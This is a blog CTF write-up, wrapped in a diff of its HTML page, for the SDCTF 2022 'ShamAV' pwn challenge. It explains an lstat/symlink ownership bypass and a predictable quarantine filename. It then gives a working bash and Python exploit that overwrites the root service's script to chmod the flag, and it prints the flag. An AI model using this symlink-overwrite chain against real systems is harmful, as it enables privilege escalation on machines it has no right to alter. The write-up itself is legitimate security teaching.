@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon/favicon-16x16.png">
+  <link rel="mask-icon" href="/static/favicon/safari_pinned_tab.svg" color="#222">
+  <link rel="manifest" href="/static/favicon/site.webmanifest">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x0 IntroductionWe just developed a new anti-virus called ShamAV. Have fun! Connect viasocat FILE:tty,raw,echo&#x3D;0 TCP:shamav.sdc.tf:1337 Flag path (Unix permission of flag is intended)&#x2F;home&amp;#">
+<meta property="og:type" content="website">
+<meta property="og:title" content="[Pwn] ShamAV [SDCTF 2022]">
+<meta property="og:url" content="http://www.aynakeya.com/ctf-writeup/2022/sdctf/pwn/shamav/index.html">
+<meta property="og:site_name" content="Aynakeya&#39;s Blog">
+<meta property="og:description" content="0x0 IntroductionWe just developed a new anti-virus called ShamAV. Have fun! Connect viasocat FILE:tty,raw,echo&#x3D;0 TCP:shamav.sdc.tf:1337 Flag path (Unix permission of flag is intended)&#x2F;home&amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-05-10T01:39:00.000Z">
+<meta property="article:modified_time" content="2022-05-10T05:30:17.000Z">
+<meta property="article:author" content="Aynakeya">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2022/sdctf/pwn/shamav/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2022/sdctf/pwn/shamav/index.html","path":"ctf-writeup/2022/sdctf/pwn/shamav/index.html","title":"[Pwn] ShamAV [SDCTF 2022]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Pwn] ShamAV [SDCTF 2022] | Aynakeya's Blog
+</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Aynakeya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Kill My Emotion</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/blog/" rel="section"><i class="fa fa-house fa-fw"></i>Home</a></li><li class="menu-item menu-item-infosec"><a href="/categories/ctf" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>InfoSec</a></li><li class="menu-item menu-item-coding"><a href="/categories/coding" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>Coding</a></li><li class="menu-item menu-item-anime"><a href="/categories/anime" rel="section"><i class="fa fa-solid fa-film fa-fw"></i>Anime</a></li><li class="menu-item menu-item-novel"><a href="/categories/novel" rel="section"><i class="fa fa-solid fa-book-open fa-fw"></i>Novel</a></li><li class="menu-item menu-item-life"><a href="/categories/life" rel="section"><i class="fa fa-solid fa-book fa-fw"></i>Life</a></li><li class="menu-item menu-item-devops"><a href="/categories/devops" rel="section"><i class="fa fa-solid fa-terminal fa-fw"></i>DevOps</a></li><li class="menu-item menu-item-archives"><a href="/archives" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-ctf-writeup"><a href="/ctf-writeup" rel="section"><i class="fa fa-book fa-fw"></i>CTF-writeup</a></li><li class="menu-item menu-item-bookmarks"><a href="/bookmarks" rel="section"><i class="fa fa-bookmark fa-fw"></i>Bookmarks</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-js-projects"><a href="/my-js-project" rel="section"><i class="fas fa-folder fa-fw"></i>Js-projects</a></li><li class="menu-item menu-item-frontpage"><a href="/" rel="section"><i class="fa fa-leaf fa-fw"></i>Frontpage</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-Introduction"><span class="nav-number">1.</span> <span class="nav-text">0x0 Introduction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-Vulnerability"><span class="nav-number">2.</span> <span class="nav-text">0x1 Vulnerability</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-Walk-through"><span class="nav-number">3.</span> <span class="nav-text">0x3 Walk through</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#first-glance"><span class="nav-number">3.1.</span> <span class="nav-text">first glance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#analysis"><span class="nav-number">3.2.</span> <span class="nav-text">analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#the-idea"><span class="nav-number">3.3.</span> <span class="nav-text">the idea</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#final-idea"><span class="nav-number">3.4.</span> <span class="nav-text">final idea</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-Exploit"><span class="nav-number">4.</span> <span class="nav-text">0x4 Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-Flag"><span class="nav-number">5.</span> <span class="nav-text">0x4 Flag</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Aynakeya"
+      src="/static/intro/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Aynakeya</p>
+  <div class="site-description" itemprop="description">my blog~</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives">
+          <span class="site-state-item-count">91</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/aynakeya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;aynakeya" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:aynakeya@aynakeya.com" title="E-Mail → mailto:aynakeya@aynakeya.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/10003632" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;10003632" rel="noopener me" target="_blank"><i class="fas fa-video fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner page posts-expand">
+
+
+    
+    
+    
+    <div class="post-block" lang="en"><header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">[Pwn] ShamAV [SDCTF 2022]
+</h1>
+
+<div class="post-meta-container">
+  <ul class="breadcrumb">
+            <li><a href="/ctf-writeup/">CTF-WRITEUP</a></li>
+            <li><a href="/ctf-writeup/2022/">2022</a></li>
+            <li><a href="/ctf-writeup/2022/sdctf/">SDCTF</a></li>
+            <li><a href="/ctf-writeup/2022/sdctf/pwn/">PWN</a></li>
+          <li>SHAMAV</li>
+  </ul>
+</div>
+
+</header>
+
+      
+      
+      <div class="post-body">
+          <h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>We just developed a new anti-virus called ShamAV. Have fun!</p>
+<p>Connect via<br>socat FILE:<code>tty</code>,raw,echo&#x3D;0 TCP:shamav.sdc.tf:1337</p>
+<p>Flag path (Unix permission of flag is intended)<br>&#x2F;home&#x2F;antivirus&#x2F;flag.txt</p>
+<p>Note<br>Ignore directory &#x2F;home&#x2F;user, you don&#39;t need to access anything under it to get the flag<br>By k3v1n</p>
+<h1 id="0x1-Vulnerability"><a href="#0x1-Vulnerability" class="headerlink" title="0x1 Vulnerability"></a>0x1 Vulnerability</h1><p>this challenge is basically manipulating with symbolic links. </p>
+<p>First bug is <code>os.lstat(path).st_uid != USER_UID</code> in <code>server.py</code>.</p>
+<p>According to man page, <code>lstate()</code> will return the property of symbolic not the real file. </p>
+<blockquote>
+<p>lstat() is identical to stat(), except that if pathname is a symbolic link, then it returns information about the link itself, not the file that the link refers to.</p>
+</blockquote>
+<p>We can bypass this check by creating a symbolic link to the file that is not owned by us.</p>
+<p>Second vuln is also related to symbolic links</p>
+<p>if we have symbolic link point to anther file, overwrite this symbolic link would actually overwrite the real file.</p>
+<p>Combine those two vuln, we can get <code>seed</code> first, then predict next filename, create symbolic link point to <code>server.py</code>.</p>
+<p>Then, we scan our new file, which will overwrite <code>server.py</code>.</p>
+<p>After than, we crash <code>server.py</code>, let <code>launcher.sh</code> to restart <code>server.py</code> and execute our code.</p>
+<h1 id="0x3-Walk-through"><a href="#0x3-Walk-through" class="headerlink" title="0x3 Walk through"></a>0x3 Walk through</h1><h2 id="first-glance"><a href="#first-glance" class="headerlink" title="first glance"></a>first glance</h2><p>challenge only provide a host and port, no other thing. But I can get everything I need through the shell.</p>
+<p>connect to server, firstly I checked the permission of the flag.txt. flag.txt is owned by antivirus, but didn&#39;t have any permission. So, I need find a way to change the permission and read the flag.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ctf@SHAMAV:~$ whoami</span><br><span class="line">ctf</span><br><span class="line">ctf@SHAMAV:~$ ls -al /home/antivirus</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 antivirus antivirus  200 May 10 04:27 .</span><br><span class="line">drwxr-xr-x 5 nobody    nogroup   4096 May  4 23:22 ..</span><br><span class="line">-rw-r--r-- 1 antivirus antivirus  697 May 10 04:27 av.log</span><br><span class="line">---------- 1 antivirus antivirus   44 May 10 04:27 flag.txt</span><br><span class="line">-rwxr-xr-x 1 antivirus antivirus  673 May 10 04:27 launcher.sh</span><br><span class="line">-rw-r--r-- 1 antivirus antivirus  260 May 10 04:27 malware-hashes.txt</span><br><span class="line">drwxrwxrwx 2 antivirus antivirus   40 May 10 04:27 quarantine</span><br><span class="line">-rw------- 1 antivirus antivirus   45 May 10 04:27 seed</span><br><span class="line">-rwxr-xr-x 1 antivirus antivirus 2643 May 10 04:27 server.py</span><br><span class="line">srwxrwxrwx 1 antivirus antivirus    0 May 10 04:27 socket</span><br></pre></td></tr></table></figure>
+
+<p>then I looked at the <code>scan</code> file under &#x2F;home&#x2F;ctf&#x2F;bin. uhhh, its just a script, and how <code>scan</code> works is sending file path to a socket, then retrieve result from that socket. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># basically this file</span></span><br><span class="line">(<span class="built_in">echo</span> -n <span class="string">&quot;file_path&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>if we scan a file, the file will be copy to <code>/home/antivirus/quarantine</code> with a random generated name. Moreover, this file is owned by <code>antivirus</code>!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctf@SHAMAV:~/virus-samples$ scan phishing.py</span><br><span class="line">ctf@SHAMAV:~/virus-samples$ ls -al /home/antivirus/quarantine</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwx 2 antivirus antivirus  60 May 10 04:37 .</span><br><span class="line">drwxr-xr-x 3 antivirus antivirus 200 May 10 04:27 ..</span><br><span class="line">-rw-r--r-- 1 antivirus antivirus 177 May 10 04:37 sham-av-8a8b989c85011653db080d7e26f7175c04a9772c5845884a2e86c42fb3f17df6</span><br></pre></td></tr></table></figure>
+
+<h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p>lets analysis two file that are responsible for the antivirus system. <a href="server.py"><code>server.py</code></a> and <a href="launcher.sh"><code>launcher.sh</code></a></p>
+<p><strong><a href="server.py">server.py</a></strong></p>
+<ul>
+<li>check if file is owned by <code>ctf</code>, <code>os.lstat(path).st_uid != USER_UID</code></li>
+<li>copy file to <code>/home/antivirus/quarantine</code> using <code>shutil.copyfile(path, target_path)</code>. target name is determined by a seed</li>
+</ul>
+<p>the check can be easily bypassed by creating a symbolic link as i mentioned in the vulnerability section</p>
+<p><strong><a href="launcher.sh">launcher.sh</a></strong></p>
+<ul>
+<li>start server.py</li>
+<li>restart server.py if server.py crash.</li>
+</ul>
+<p>filename is generate by following function, so if I know the seed, I can predict the filename that will be generated in the future.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">genrandom</span>():</span><br><span class="line">    <span class="keyword">global</span> ctr</span><br><span class="line">    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder=<span class="string">&#x27;little&#x27;</span>) + seed).hexdigest()</span><br><span class="line">    ctr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+
+<h2 id="the-idea"><a href="#the-idea" class="headerlink" title="the idea"></a>the idea</h2><p>I come up with following basic idea</p>
+<ol>
+<li>modify <code>server.py</code> so that it execute <code>chmod 777 flag.txt</code></li>
+<li>find way to crash <code>server.py</code></li>
+<li><code>launcher.sh</code> will execute <code>chmod 777 flag.txt</code> and I can cat flag</li>
+</ol>
+<p>crash <code>server.py</code> is pretty easy, we create a symlink to <code>flag.txt</code>, and pass <code>flag.txt</code> to the server. since <code>flag.txt</code> is not readable, the program will throw an exception and crash.</p>
+<p>modify <code>server.py</code> is bit tricky. </p>
+<p>In server.py, we have <code>shutil.copyfile(path, target_path)</code> that copy file. If the <code>target_path</code> exists and it is a symbolic link, this will overwrite the real file. Using this, I can overwrite <code>server.py</code></p>
+<p>But how can i predict the filename, I need seed to do that. </p>
+<p>Obtain <code>seed</code> is also easy.</p>
+<p>although ctf user don&#39;t have read permission on <code>seed</code> file, I can &quot;scan&quot; <code>seed</code> file and obtain seed from the file copied by <code>server.py</code></p>
+<h2 id="final-idea"><a href="#final-idea" class="headerlink" title="final idea"></a>final idea</h2><ol>
+<li>create symlink to <code>seed</code>, send <code>seed</code> to server and get seed</li>
+<li>predict next filename, create symlink point to <code>server.py</code> using that name</li>
+<li>create a file and execute <code>chmod 777 flag.txt</code>, scan this file and overwrite <code>server.py</code></li>
+<li>create symlink to <code>flag.txt</code>, send <code>flag.txt</code> to server and crash the server</li>
+<li><code>launcher.sh</code> will execute code and I can cat flag.</li>
+</ol>
+<h1 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h1><p>file_name_predict.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64, socket, os, hashlib, shutil, sys</span><br><span class="line">USER_UID = <span class="number">1002</span></span><br><span class="line">CTR_LENGTH = <span class="number">256</span></span><br><span class="line">STDIO_DEBUG = <span class="literal">False</span></span><br><span class="line">seed = <span class="string">&quot;ZFhtPShqL2BjJQw7MwAPBjEwMolJ6qndj4v9v+2vEK8=&quot;</span> <span class="comment"># seed from seed file</span></span><br><span class="line">ctr = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">seed = base64.b64decode(seed)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genrandom</span>():</span><br><span class="line">    <span class="keyword">global</span> ctr</span><br><span class="line">    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder=<span class="string">&#x27;little&#x27;</span>) + seed).hexdigest()</span><br><span class="line">    ctr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;/home/antivirus/quarantine/sham-av-<span class="subst">&#123;genrandom()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;/home/antivirus/quarantine/sham-av-<span class="subst">&#123;genrandom()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;/home/antivirus/quarantine/sham-av-<span class="subst">&#123;genrandom()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>exploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /home/antivirus/seed /home/ctf/seed</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;/home/ctf/seed&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -s /home/antivirus/server.py /home/antivirus/quarantine/sham-av-b5d2c8eb62cf9108369b50d1f4a5928821b2e28f3b5606009285a502c96c1a8f <span class="comment"># the predict filename</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;#! /usr/bin/env python3\nimport os\nos.system(&#x27;chmod 777 flag.txt&#x27;)&quot;</span> &gt; /home/ctf/x</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;/home/ctf/x&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al /home/antivirus/quarantine</span><br><span class="line"><span class="built_in">cat</span> /home/antivirus/server.py</span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -s /home/antivirus/flag.txt /home/ctf/flag.txt</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;/home/ctf/flag.txt&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al /home/antivirus/</span><br><span class="line"><span class="built_in">cat</span> /home/antivirus/flag.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{5ymL1Nks_ar3_4_curs3d_f3a7uRe_0f_*NIX}</p>
+
+      </div>
+      
+      
+      
+    </div>
+  <ul class="breadcrumb">
+            <li><a href="/ctf-writeup/">CTF-WRITEUP</a></li>
+            <li><a href="/ctf-writeup/2022/">2022</a></li>
+            <li><a href="/ctf-writeup/2022/sdctf/">SDCTF</a></li>
+            <li><a href="/ctf-writeup/2022/sdctf/pwn/">PWN</a></li>
+          <li>SHAMAV</li>
+  </ul>
+
+    
+    
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Aynakeya</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
